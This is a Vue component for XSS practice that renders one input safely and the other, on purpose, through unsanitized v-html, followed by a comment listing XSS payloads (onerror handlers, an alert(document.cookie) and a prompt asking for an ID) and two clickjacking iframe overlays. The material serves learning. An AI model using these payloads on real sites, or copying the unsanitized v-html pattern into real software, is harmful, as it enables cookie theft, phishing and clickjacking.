<script setup>
    import {ref} from 'vue'
    const payload = ref('')
    const injectHtml = ref('')

  
</script>

<template>

    <section class="container">

        <div class="m-3">
            <h4>Window</h4>
            <div class="window p-3" >
                {{ payload}} 
                <p v-html="injectHtml"></p>
            </div>
        </div>
        
        <div class="m-3">
            <label for="">GoodVue- Try a payload: </label>
            <input type="text" class="form-control" v-model="payload">
            <button type="submit" class="btn btn-primary mt-3">submit </button>
        </div>
        
        <div class="m-3" >
            <label for="">BadVue- Try a payload:</label>
            <input name="" id="" class="form-control" v-model="injectHtml"></input>
            <button type="submit" class="btn btn-primary mt-3">submit </button>
        </div>
    </section>
</template>


<!-- 
SCRIPTS XSS

Fucntionning :
    HTML tags : strong, h1, h2..., input
    <input type="text" value="whatever" style="color:white; background-color:red"></input>
    <img src=whatever onerror=alert('youhou')>
    <img src=whatever onerror="window.location='https://github.com/fabienAstia/xss-vulnerabilities/tree/main';">
    <img src=whatever onerror=console.log("Error is sucess")>
    <img src/onerror=prompt('youhou')>
    <a onmouseover="alert('youhou')"\>Click me!</a>
    <a href="https://github.com/fabienAstia/xss-vulnerabilities/tree/main">clickme</a>
    <a onclick=alert(document.cookie) href="#">Submit</a>
    
    Trying some Clickjacking :
    <style>
        iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
        }
        div {
        position:absolute;
        top:470px;
        left:60px;
        z-index: 1;
        }
        </style>
        <div>Click me</div>
        <iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>

    <style>
        iframe {
        position:relative;
        width: 500px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
        }
        .firstClick, .secondClick {
        position:absolute;
        top:330px;
        left:60px;
        z-index: 1;
        }
        .secondClick {
        left:210px;
        }
        </style>
        <div class="firstClick">Click me first</div>
        <div class="secondClick">Click me next</div>
        <iframe src="https://vulnerable.net/account"></iframe>


 Not Fucntionning:
    <script>alert('youhou')</script>
    <img src/onerror=prompt('Sorry, an error was occur. Please, enter your Id to continue')>
    <component is=script text=alert(1)>

 -->



<style scoped>
    .window{
        height: 180px;
        border: 2px solid black;
    }
</style>

